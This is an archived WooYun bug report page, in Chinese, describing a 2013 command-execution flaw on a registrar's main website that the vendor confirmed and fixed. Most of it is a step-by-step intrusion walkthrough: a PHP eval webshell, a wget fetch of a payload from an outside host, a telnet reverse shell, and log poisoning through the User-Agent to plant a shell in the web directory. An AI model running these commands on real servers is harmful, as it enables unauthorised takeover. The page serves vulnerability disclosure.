@@ -1,0 +1,290 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新网互联主站命令执行漏洞主站沦陷（非struts漏洞）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新网互联主站命令执行漏洞主站沦陷（非struts漏洞）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/瞌睡龙">瞌睡龙</a> 
+</li><li>提交时间：		2013-06-26 12:28</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-06-26：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-06-27：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-07-07：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-07-17：	细节向普通白帽子公开<br/>
+									2013-07-27：	细节向实习白帽子公开<br/>
+									2013-08-10：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">主站的命令执行~嗷</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">一处犀利的命令执行<br />
+<br />
+</p><p class="detail"><a href="../images/2612141930fae42ad938583139f1777aaa9b7a3e.jpg" target="_blank"><img src="../images/2612141930fae42ad938583139f1777aaa9b7a3e.jpg" alt="xw1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+pwd看向当前网站路径：<br />
+<br />
+/home/member/www/live/domainv2 <br />
+<br />
+找是否有可写目录：<br />
+<br />
+</p><p class="detail"><a href="../images/2612165944d8bee4a0ce1531722814eb313c66f1.jpeg" target="_blank"><img src="../images/2612165944d8bee4a0ce1531722814eb313c66f1.jpeg" alt="xw2.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+果断写shell啊<br />
+<br />
+echo &quot;&lt;?php eval(\$_POST[l])?&gt;&quot; &gt; /home/member/www/live/upload/111.php <br />
+<br />
+<br />
+<br />
+cat下看看<br />
+<br />
+cat /home/member/www/live/upload/111.php <br />
+<br />
+</p><p class="detail"><a href="../images/26121759a83ffe7d24d3680a434be734d21f6b7b.jpeg" target="_blank"><img src="../images/26121759a83ffe7d24d3680a434be734d21f6b7b.jpeg" alt="xw3.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+妈蛋的什么都没有，什么情况，可能有特殊字符过滤了，继续黑盒测试。<br />
+<br />
+<br />
+<br />
+换wget再试试：<br />
+<br />
+wget http://bluetest.duapp.com/eval.txt -O /home/member/www/live/upload/zzz.php<br />
+<br />
+依然失败。<br />
+<br />
+<br />
+<br />
+linux一条命令直接反弹端口回来试下：<br />
+<br />
+telnet x.x.x.x 1111 | /bin/sh | telnet x.x.x.x 2222<br />
+<br />
+</p><p class="detail"><a href="../images/26121830a1f172ec45c531467b4c10e2107226e3.jpeg" target="_blank"><img src="../images/26121830a1f172ec45c531467b4c10e2107226e3.jpeg" alt="xw4.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+发现弹回来了，但是会马上断开连接，后来才知道FreeBSD的是Unix的不支持这种。。。<br />
+<br />
+</p><p class="detail"><a href="../images/2612185889d1a3972fed03193d81be08c74d556d.jpeg" target="_blank"><img src="../images/2612185889d1a3972fed03193d81be08c74d556d.jpeg" alt="xw5.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+把shell写进系统里，然后mv到web目录下试试~<br />
+<br />
+试一下apache日志的方式<br />
+<br />
+<br />
+<br />
+进程中找到apache的路径<br />
+<br />
+ps -aux<br />
+<br />
+<br />
+<br />
+找到apache配置文件<br />
+<br />
+cat /usr/local/apache/conf/httpd.conf<br />
+<br />
+<br />
+<br />
+找到日志地址 <br />
+<br />
+tail -100 /usr/local/apache/logs/access_log <br />
+<br />
+</p><p class="detail"><a href="../images/2612212025c64b8a656ca24042f747da2d8adf4d.jpeg" target="_blank"><img src="../images/2612212025c64b8a656ca24042f747da2d8adf4d.jpeg" alt="xw6.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+把浏览器UA改成 <br />
+<br />
+&lt;?php eval($_POST[l]);?&gt;<br />
+<br />
+然后tail几遍看看日志<br />
+<br />
+</p><p class="detail"><a href="../images/261222177cc2daf345e7c7b81baa6c601cbbed02.jpeg" target="_blank"><img src="../images/261222177cc2daf345e7c7b81baa6c601cbbed02.jpeg" alt="xw7.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+干的漂亮，导出到web目录试试~<br />
+<br />
+tail -1000 /usr/local/apache/logs/access_log &gt; /home/member/www/live/upload/a.php<br />
+<br />
+访问一下a.php： <br />
+<br />
+</p><p class="detail"><a href="../images/26122330ccfd0eac5237f775c8c85c3570983239.jpeg" target="_blank"><img src="../images/26122330ccfd0eac5237f775c8c85c3570983239.jpeg" alt="xw8.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+一句话连接<br />
+<br />
+http://www.dns.com.cn/upload/a.php<br />
+<br />
+</p><p class="detail"><a href="../images/261224152c490c8e68403e47d619de6186ef48a8.jpeg" target="_blank"><img src="../images/261224152c490c8e68403e47d619de6186ef48a8.jpeg" alt="xw9.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+你也可以试下grep出eval来导出大小会小很多，不过1000行还好~<br />
+<br />
+<br />
+<br />
+看了下/var/log目录下的一些日志文件：<br />
+<br />
+检查新生成php文件<br />
+<br />
+/var/log/find_new_php.log <br />
+<br />
+<br />
+<br />
+<br />
+<br />
+检查危险函数<br />
+<br />
+/var/log/check_dangerous.log <br />
+<br />
+<br />
+<br />
+监控做的挺好，但是检查出的那么多危险函数怎么就不管了呢~ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">正则匹配严格些，逻辑上别出问题。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/瞌睡龙" title="瞌睡龙">瞌睡龙</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-026945" title="新网互联主站命令执行漏洞主站沦陷（非struts漏洞）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-06-27 09:26</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">问题已经确认，并修复了。太郁闷了，2次死在同一个沟里。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="26945";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
